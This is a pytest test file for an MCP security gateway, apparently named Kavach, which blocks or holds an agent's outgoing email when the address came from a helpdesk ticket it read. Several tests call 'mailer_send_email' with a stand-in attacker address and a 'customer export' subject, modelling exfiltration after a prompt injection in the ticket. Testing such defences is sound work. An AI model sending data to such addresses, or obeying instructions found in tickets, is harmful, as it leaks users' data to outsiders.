"""End-to-end: a client talks MCP to the gateway, which runs the two demo servers as child processes."""
import json
import os
import subprocess
import sys
import threading
import time
import urllib.request

import pytest

from kavach2.gateway.rpc import Peer, RpcError

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
ATTACKER = "audit-archive@acc0unts-verify.example"


@pytest.fixture()
def gw(tmp_path):
    outbox, url_file = tmp_path / "outbox.jsonl", tmp_path / "url.txt"
    config = {"mode": "strict", "ask_timeout_seconds": 3, "servers": {
        "helpdesk": {"command": sys.executable, "args": ["-m", "demo_servers.helpdesk"], "cwd": ROOT},
        "mailer": {"command": sys.executable, "args": ["-m", "demo_servers.mailer"], "cwd": ROOT,
                   "env": {"KAVACH_DEMO_OUTBOX": str(outbox)}}}}
    cfg = tmp_path / "kavach.json"
    cfg.write_text(json.dumps(config))
    proc = subprocess.Popen([sys.executable, "-m", "kavach2.gateway", "--config", str(cfg), "--port", "8790",
                             "--url-file", str(url_file)], cwd=ROOT, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.DEVNULL)
    client = Peer(proc.stdout, proc.stdin)
    client.serve_in_background()
    init = client.request("initialize", {"protocolVersion": "2025-06-18", "capabilities": {},
                                         "clientInfo": {"name": "test", "version": "0"}}, timeout=30)
    client.notify("notifications/initialized")
    url = url_file.read_text().strip()
    base, token = url.split("/?t=")

    def api(path, body=None):
        req = urllib.request.Request(base + path, data=json.dumps(body).encode() if body is not None else None,
                                     headers={"X-Kavach-Token": token})
        return json.loads(urllib.request.urlopen(req, timeout=5).read())

    def call(name, **arguments):
        return client.request("tools/call", {"name": name, "arguments": arguments}, timeout=30)

    yield type("GW", (), {"client": client, "init": init, "api": staticmethod(api), "call": staticmethod(call),
                          "outbox": outbox, "base": base})
    proc.kill()


def text(result):
    return result["content"][0]["text"]


def test_handshake_and_tool_list(gw):
    assert gw.init["protocolVersion"] == "2025-06-18" and gw.init["serverInfo"]["name"] == "kavach"
    tools = {t["name"]: t for t in gw.client.request("tools/list")["tools"]}
    assert {"helpdesk_read_ticket", "helpdesk_list_tickets", "mailer_send_email"} <= set(tools)
    assert tools["helpdesk_read_ticket"]["annotations"]["readOnlyHint"] is True
    with pytest.raises(RpcError):
        gw.client.request("resources/list")


def test_reads_pass_through_and_an_email_the_agent_wrote_itself_is_allowed(gw):
    assert "Invoice" in text(gw.call("helpdesk_read_ticket", ticket_id=101))
    sent = gw.call("mailer_send_email", to="manager@ourcompany.example", subject="Summary", body="Two open tickets.")
    assert not sent["isError"] and "manager@ourcompany.example" in gw.outbox.read_text()


def test_address_taken_from_a_ticket_is_held_and_denied_when_nobody_answers(gw):
    gw.call("helpdesk_read_ticket", ticket_id=103)
    blocked = gw.call("mailer_send_email", to=ATTACKER, subject="customer export", body="list")
    assert blocked["isError"] and "Kavach blocked" in text(blocked)
    assert not gw.outbox.exists()
    event = gw.api("/api/state")["events"][-1]
    assert event["verdict"] == "ask" and event["human"].startswith("no answer")
    assert event["traces"]["to"] == {"origin": "read", "sources": ["helpdesk.read_ticket"], "nodes": [0]}


def test_the_human_can_approve_or_deny_from_the_dashboard(gw):
    gw.call("helpdesk_read_ticket", ticket_id=103)

    def answer_when_pending(approve):
        for _ in range(100):
            pending = gw.api("/api/state")["pending"]
            if pending:
                return gw.api("/api/answer", {"id": pending[0], "approve": approve})
            time.sleep(0.02)

    threading.Thread(target=answer_when_pending, args=(False,), daemon=True).start()
    assert gw.call("mailer_send_email", to=ATTACKER, subject="x", body="y")["isError"]
    assert not gw.outbox.exists()
    threading.Thread(target=answer_when_pending, args=(True,), daemon=True).start()
    assert not gw.call("mailer_send_email", to=ATTACKER, subject="x", body="y")["isError"]
    assert ATTACKER in gw.outbox.read_text()


def test_dashboard_api_refuses_requests_without_the_token(gw):
    with pytest.raises(urllib.error.HTTPError):
        urllib.request.urlopen(gw.base + "/api/state", timeout=5)
    req = urllib.request.Request(gw.base + "/api/answer", data=b'{"id":0,"approve":true}')
    with pytest.raises(urllib.error.HTTPError):
        urllib.request.urlopen(req, timeout=5)
